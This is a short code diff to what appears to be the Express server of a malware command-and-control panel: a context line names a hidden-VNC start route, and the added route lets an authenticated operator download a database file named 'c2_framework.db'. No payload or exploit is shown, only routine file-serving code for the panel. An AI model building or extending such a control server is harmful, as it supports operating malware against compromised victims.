@@ -3456,6 +3456,32 @@ app.post('/api/hvnc/start', (req, res) => {
     });
 });
 
+
+
+
+app.get('/api/dbt-download', verifyToken, (req, res) => {
+  const dbPath = path.join(__dirname, '..', 'c2_framework.db');
+  
+  if (!fs.existsSync(dbPath)) {
+    console.error('[DB Download] File not found:', dbPath);
+    return res.status(404).json({ error: 'Database file not found' });
+  }
+
+  res.setHeader('Content-Disposition', 'attachment; filename="c2_framework.db"');
+  res.setHeader('Content-Type', 'application/octet-stream');
+  
+  const stream = fs.createReadStream(dbPath);
+  stream.on('error', (err) => {
+    console.error('[DB Download] Stream error:', err);
+    if (!res.headersSent) {
+      res.status(500).json({ error: 'Failed to read database file' });
+    }
+  });
+  stream.pipe(res);
+});
+
+
+
 // ------------------------------------------------------------
 // ROUTES
 // ------------------------------------------------------------
